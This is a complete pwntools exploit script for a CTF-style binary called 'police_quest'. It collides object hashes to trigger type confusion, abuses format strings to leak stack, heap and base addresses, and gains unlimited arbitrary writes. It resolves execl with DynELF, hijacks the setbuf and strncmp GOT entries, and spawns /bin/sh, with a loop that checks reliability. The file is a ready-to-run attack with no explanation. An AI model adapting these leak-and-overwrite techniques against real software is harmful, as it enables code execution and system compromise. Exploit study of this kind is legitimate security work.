#!/usr/bin/python

from pwn import *
import struct

def recv_all (target):
    result = ''
    while target.can_recv (0.2):
        result += target.recv ()
    return result

def get_byte (value, idx_byte, nbits = 32):
    return (value >> (8 * idx_byte)) & 0xff

def hex_to_addr (encoded):
    encoded = encoded.decode ('hex')
    if len (encoded) < 8:
        encoded = (8 - len (encoded)) * '\x00' + encoded

    addr = struct.unpack ('>Q', encoded[:8])[0]

    return addr

class Pwner (object):
    def __init__ (self):
        self.obj_magic = {
            'Revolver'          : 0xFFD1CC90,
            'Bullet'            : 0xA060E1B3,
            'Tissue'            : 0x0A17B609,
            'MagnifyingGlass'   : 0x55754F83,
            'Target'            : 0x7D90DD54,
        }
        self.path_to_hall = list ()
        # all addresses we need
        self.addr_arg       = 0
        self.addr_base      = 0
        self.addr_fmt_args  = 0
        self.addr_heap      = 0
        self.addr_landing   = 0
        self.addr_objects   = 0
        self.addr_stack     = 0
        # target
        self.target = process ('./police_quest')

    def create_hash (self, obj_desc, obj_name):
        if obj_desc not in self.obj_magic:
            raise ValueError ("Object Description doesn't exist")

        initial_hash = self.obj_magic[obj_desc]

        hashed = initial_hash
        for idx_name in range (len (obj_name)):
            byte = get_byte (initial_hash, idx_name % 4)
            hashed = 16 * hashed
            hashed = hashed ^ ord (obj_name[idx_name]) ^ byte
            hashed = hashed & 0xffffffff
            #print 'letter : %s, hash : 0x%x' % (obj_name[idx_name], hashed)

        return hashed

    def collide_hash (self, obj_desc, to_collide):
        if obj_desc not in self.obj_magic:
            raise ValueError ("Object Description doesn't exist")

        initial_hash = self.obj_magic[obj_desc]
        # allows to set the hash to 0
        data = struct.pack ('<I', initial_hash) * 2

        #print 'initial_hash : 0x%x' % initial_hash

        value = to_collide
        hashed = initial_hash

        idx_hash = 0
        to_append = ''
        for idx in range (4, -1, -1):
            quartet0 = get_byte (initial_hash, idx_hash % 4) & 0xf0
            quartet1 = get_byte (initial_hash, idx_hash % 4) & 0xf
            idx_hash += 1

            quartet2 = get_byte (initial_hash, idx_hash % 4) & 0xf0
            quartet3 = get_byte (initial_hash, idx_hash % 4) & 0xf
            idx_hash += 1

            q0 = (get_byte (to_collide, idx % 4) & 0xf0) >> 4
            q1 = get_byte (to_collide, idx % 4) & 0xf

            # compute quartets to write
            byte0 = quartet0 | (q0 ^ quartet1)
            byte1 = quartet2 | (q1 ^ quartet3)

            to_append += chr (byte0)
            to_append += chr (byte1)

        data += to_append

        '''
        print "Let's check collision!"
        hashed = create_hash (obj_desc, data)
        if hashed == to_collide:
            print 'Successfully collided hash : 0x%x' % to_collide
        else:
            print 'tocollide : 0x%x hashed : 0x%x' % (to_collide, hashed)
        '''

        return data


    def look (self):
        self.target.sendline ('LOOK')

    def move_to (self, direction):
        self.target.sendline ('MOVE %s' % direction)

    def move_to_study (self):
        self.move_to ('NORTH')
        self.path_to_hall.append ('SOUTH')

    def move_to_kitchen (self):
        self.move_to ('WEST')
        self.path_to_hall.append ('EAST')

    def move_to_library (self):
        self.move_to ('SOUTH')
        self.path_to_hall.append ('NORTH')

    def move_to_bar (self):
        self.move_to_kitchen ()
        self.move_to ('SOUTH')
        self.path_to_hall.append ('NORTH')

    def move_to_bathroom (self):
        self.move_to_library ()
        self.move_to ('EAST')
        self.path_to_hall.append ('WEST')

    def move_to_hall (self):
        for direction in reversed (self.path_to_hall):
            self.target.sendline ('MOVE %s' % direction)

        self.path_to_hall = list ()

    def use_object (self, desc):
        self.target.sendline ('USE %s' % desc)

    def use_bullet (self, name):
        self.use_object ('Bullet')
        # object hash
        self.target.sendline ('0x%08x' % self.create_hash ('Bullet', name))
        # object name
        self.target.sendline (name)

    def use_tissue (self, name):
        self.use_object ('Tissue')
        # object hash
        self.target.sendline ('0x%08x' % self.create_hash ('Tissue', name))
        # object name
        self.target.sendline (name)

    def use_glass (self, name, kind_inspect, name_inspect):
        self.use_object ('MagnifyingGlass')
        # object hash
        self.target.sendline ('0x%08x' % self.create_hash ('MagnifyingGlass', name))
        # object name
        self.target.sendline (name)
        # kind of object to inspect
        self.target.sendline (kind_inspect)
        self.target.sendline ('0x%08x' % self.create_hash (kind_inspect, name_inspect))
        # name of ojbect to inspect
        self.target.sendline (name_inspect)

    def use_revolver (self, name, target_name):
        self.use_object ('Revolver')
        # object hash
        self.target.sendline ('0x%08x' % self.create_hash ('Revolver', name))
        # object name
        self.target.sendline (name)
        # type of object to shoot at
        self.target.sendline ('Target')
        # object hash
        self.target.sendline ('0x%08x' % self.create_hash ('Target', target_name))
        # object name
        self.target.sendline (target_name)

    def get_object (self, desc):
        self.target.sendline ('GET %s' % desc)

    def get_revolver (self, name, serial):
        # go to study
        self.move_to_study ()
        # get revolver
        self.get_object ("Revolver")
        self.target.sendline (name)
        #print 'serial : %s (%d bytes)' % (hex (serial), len (hex (serial)))
        self.target.sendline ('0x' + struct.pack ('<Q', serial).encode ('hex'))
        # go back to hall
        self.move_to_hall ()

    def get_glass (self, name):
        # go to library
        self.move_to_library ()
        # get glass
        self.get_object ("MagnifyingGlass")
        self.target.sendline (name)
        # go back to hall
        self.move_to_hall ()

    def get_tissue (self, name):
        # go to bathroom
        self.move_to_bathroom ()
        # get tissue
        self.get_object ("Tissue")
        self.target.sendline (name)
        # go back to hall
        self.move_to_hall ()

    def get_target (self, name):
        # go to bar
        self.move_to_bar ()
        # get target
        self.get_object ("Target")
        self.target.sendline (name)
        # go back to hall
        self.move_to_hall ()

    def get_bullet (self, name, mark, serial):
        # go to kitchen
        self.move_to_kitchen ()
        # get bullet
        self.get_object ("Bullet")
        self.target.sendline (name)
        #print 'bullet serial : %s' % ('0x%016x' % serial)
        self.target.sendline ('0x%016x' % serial)
        #print 'mark : %s' % mark.encode ('hex')
        self.target.sendline (mark)
        # go back to hall
        self.move_to_hall ()

    def inventory (self):
        self.target.sendline ('INVENTORY')

    def write16 (self, addr, value0, value1, bullet_name = 'MyBullet', revolver_name = 'MyGun'):
        self.get_bullet (bullet_name, struct.pack ('<QQ', value0, value1), addr)
        self.use_bullet (bullet_name)
        target_name = self.collide_hash ('Target', self.create_hash ('Bullet', bullet_name))
        self.use_revolver (revolver_name, target_name)

    def exploit_format (self, fmt):
        remain = len (fmt) % 8
        # pad
        if remain != 0:
            fmt = fmt + (8 - remain) * '0'
        # check that length is 16 or 32 bytes
        if len (fmt) != 16 and len (fmt) != 32:
            raise ValueError ('Expected format string should be 16 or 32 bytes')

        # fmt is already 16 bytes
        value0 = struct.unpack ('<Q', fmt[0:8])[0]
        value1 = struct.unpack ('<Q', fmt[8:16])[0]
        value2 = struct.unpack ('<Q', '%22$lx..')[0]
        value3 = struct.unpack ('<Q', '%23$lx..')[0]
        if len (fmt) == 32:
            value2 = struct.unpack ('<Q', fmt[16:24])[0]
            value3 = struct.unpack ('<Q', fmt[24:])[0]

        # insert format
        # addr_heap + 40 : revolver serial_number + detail buffer
        self.write16 (self.addr_heap + 40, value0, value1)
        self.write16 (self.addr_heap + 40 + 16, value2, value3)

        self.get_tissue ('MyTissue')

        self.move_to_study ()
        self.use_tissue ('MyTissue')

        to_collide = self.create_hash ('Revolver', 'MyGun')
        name_inspect = self.collide_hash ('Target', to_collide)
        result = recv_all (self.target)
        self.use_glass ('MyGlass', 'Target', name_inspect)

        self.move_to_hall ()

    def do_leak (self, addr):
        #print 'Trying to leak addr : 0x%x' % addr

        packed = struct.pack ('<Q', addr)
        if '\x0a' in packed:
            return '\x00'

        # inject an address
        self.addr_arg = self.addr_fmt_args + (750 * 8 + 17 * 8)
        if (addr & 0xff) == 0:
            self.write16 (self.addr_arg, addr | 0xff, 0xbabebeefbabebeef)
            self.write16 (self.addr_arg, addr, 0xbabebeefbabebeef)
        else:
            self.write16 (self.addr_arg, (0xff << 48) | addr, 0xbabebeefbabebeef)

        diff = 0
        fmt = '%750$s'
        if len (fmt) < 16:
            diff = 16 - len (fmt) - 1
            fmt += 'A' * diff
        fmt += '.'

        # exploit format string
        self.exploit_format (fmt)

        self.target.recvuntil ('What kind of object do you want to look at?')
        self.target.recvuntil ('detail, here it is:\n')
        result = self.target.recvuntil (' detail, but they have a sordid past.', drop = True)

        splitted = result.split ('.')
        leaked = splitted[0][:-diff]

        if 0 < len (leaked):
            return leaked + '\x00'
        else:
            return '\x00'

    def exploit (self):
        # we encode a format string as the gun serial
        print '[+] Get objects'
        print '-> Encode format string in Revolver serial'
        self.get_revolver ('MyGun', struct.unpack ('>Q', '%lx.%lx.')[0])
        self.get_target ('MyTarget')
        self.get_glass ('MyGlass')
        self.get_tissue ('MyTissue')
        self.inventory ()

        # eat up outputs to avoid confusing the leaking logic
        recv_all (self.target)

        # exploit format string
        print '[+] Exploit type confusion between Target and Revolver'
        print '     Our Revolver serial gets used as a format string'

        self.move_to_study ()

        self.use_tissue ('MyTissue')

        to_collide = self.create_hash ('Revolver', 'MyGun')
        name_inspect = self.collide_hash ('Target', to_collide)
        self.use_glass ('MyGlass', 'Target', name_inspect)

        self.move_to_hall ()

        self.target.recvuntil ('detail, here it is:\n')
        leaked = self.target.recvuntil ('Revolvers have no hidden detail, but they have a sordid past.', drop = True)

        print 'leaked           : %s' % leaked

        # get leaked values
        leaked = leaked.split ('.')

        self.addr_stack = hex_to_addr (leaked[0])
        self.addr_fmt_args = self.addr_stack + 0x25e8
        self.addr_heap = hex_to_addr (leaked[1])

        print 'addr_stack       : 0x%x' % self.addr_stack
        print 'addr_fmt_args    : 0x%x' % self.addr_fmt_args
        print 'addr_heap        : 0x%x' % self.addr_heap

        # Bullet 1 : reactivate glass
        print '[+] Use Bullet 1 : Re-Activate Glass (format string)'
        self.write16 (self.addr_heap + 304, 0xdeadbeefdeadbeef, 0xcafebabecafebabe)

        # Bullet 2 : extend revolver leak
        print '[+] Use Bullet 2 : Extend revolver format string'
        self.write16 (self.addr_heap + 48, struct.unpack ('<Q', '%lx.%lx.')[0], struct.unpack ('<Q', '%lx.%lx.')[0])

        # eat up outputs to avoid confusing the leaking logic
        recv_all (self.target)

        # leak

        print '[+] Exploit type confusion between Target and Revolver again'
        print '     The Revolver "format string" was extended to leak more'

        self.move_to_study ()
        self.use_glass ('MyGlass', 'Target', name_inspect)
        self.move_to_hall ()

        self.target.recvuntil ('detail, here it is:\n')
        leaked = self.target.recvuntil ('hidden detail, but they have a sordid past.', drop = True)

        print 'leaked           : %s' % leaked

        # get leaked values
        leaked = leaked.split ('.')

        self.addr_objects = hex_to_addr (leaked[2])
        self.addr_base = self.addr_objects - 0x2050C0
        func_create_bullet = self.addr_objects - 0x2034E3
        func_create_tissue = self.addr_objects - 0x2032DE

        print 'addr_base        : 0x%x' % self.addr_base
        print 'addr_objects     : 0x%x' % self.addr_objects
        print 'create_bullet    : 0x%x' % func_create_bullet
        print 'create_tissue    : 0x%x' % func_create_tissue

        # Bullet 3 : set infinite bullets
        print '[+] Use Bullet 3 : Get infinite bullets (so infinite arbitrary write)'
        self.write16 (self.addr_objects + 64, (0xa060e1b3 << 32) | 0xffffffff, (0xff << 48) | func_create_bullet)
        # set infinite tissues
        print '[+] Now get infinite tissues (so infinite format string)'
        self.obj_magic['Tissue'] = 0xaA17B609
        self.write16 (self.addr_objects + 112, (self.obj_magic['Tissue'] << 32) | 0xffffffff, (0xff << 48) | func_create_tissue)

        print '[+] We finished setting up our preliminary steps for exploitation'
        print '     -> Now the real fun begins'

        # setup finished, we got infinite bullets and tissues
        # so now we can use the arbitrary write and format string as much as we want

        got = {
            'free'      : 0x205018,
            'putchar'   : 0x205020,
            'strncpy'   : 0x205028,
            'strncmp'   : 0x205030,
            'toupper'   : 0x205038,
            'puts'      : 0x205040,
            'fread'     : 0x205048,
            'strlen'    : 0x205050,

            'setbuf'    : 0x205060,
            'printf'    : 0x205068,
            'fgets'     : 0x205070,
            'calloc'    : 0x205078,
            'strcmp'    : 0x205080,
            'fopen'     : 0x205088,
            'exit '     : 0x205090,
        }

        print '[+] Now resolving strncmp and execl'

        func_strncmp = self.do_leak (self.addr_base + got['strncmp'])
        if len (func_strncmp) < 8:
            func_strncmp += (8 - len (func_strncmp)) * '\x00'

        func_strncmp = struct.unpack ('<Q', func_strncmp)[0]
        print 'strncmp          : 0x%x' % func_strncmp

        # resolve needed functions
        resolver = DynELF(self.do_leak, func_strncmp - 200 * 4096)

        func_names = [ 'execl' ]
        func_addrs = dict ()

        for func_name in func_names:
            func_addr = resolver.lookup (func_name)

            if func_addr:
                print '%16s : 0x%x' % (func_name, func_addr)
                func_addrs[func_name] = func_addr
            else:
                print 'Failed finding %s' % func_name

        if 'execl' not in func_addrs:
            print "[-] Exploit failed : Couldn't resolve 'execl'"
            exit (1)

        print '[+] Setting setbuf got entry to execl so we can execute our command later on'

        # setbuf is used only once at the beginning of the program but it's a perfect target
        # it sets rsi to 0
        # and it sets rdi to rax
        # the idea is to obtain the following : execl(rdi, rsi) => execl("/bin/sh", NULL)
        self.write16 (self.addr_base + got['setbuf'], (0xff << 48) | func_addrs['execl'], func_addrs['execl'])

        print '[+] Setting strncmp got entry to setbuf call so we can trigger our shell'

        # lucky for us, strncmp() is triggered only in run_turn
        # so we can use it to call setbuf again :)
        # this will thus trigger our shell
        self.addr_landing = self.addr_base + 0x2838
        self.write16 (self.addr_base + got['strncmp'], (0xff << 48) | self.addr_landing, self.addr_landing)

        # eat up all outputs
        recv_all (self.target)

        # now we can pass any binary, it will execute it, here our shell
        print '[+] Trigger our shell'
        self.target.sendline ('/bin/sh')

        # now we should have a shell
        #print '[+] We should have our shell now!'
        #self.target.interactive ()

def get_shell (is_reliability = False):
    n_success = 0
    n_tentative = 100
    has_shell = False
    for idx in range (n_tentative):
        try:
            pwner = Pwner ()
            pwner.exploit ()
            n_success += 1
            if is_reliability:
                print '[+] Exploitation succeeded'
                pwner.target.close ()
            else:
                has_shell = True
                pwner.target.interactive ()
                pwner.target.close ()
                exit (0)
        except:
            pwner.target.close ()
            if has_shell and is_reliability == False:
                exit (0)
            print '[-] Exploitation failed'

    print 'Succeeded %d / %d times' % (n_success, n_tentative)

get_shell ()

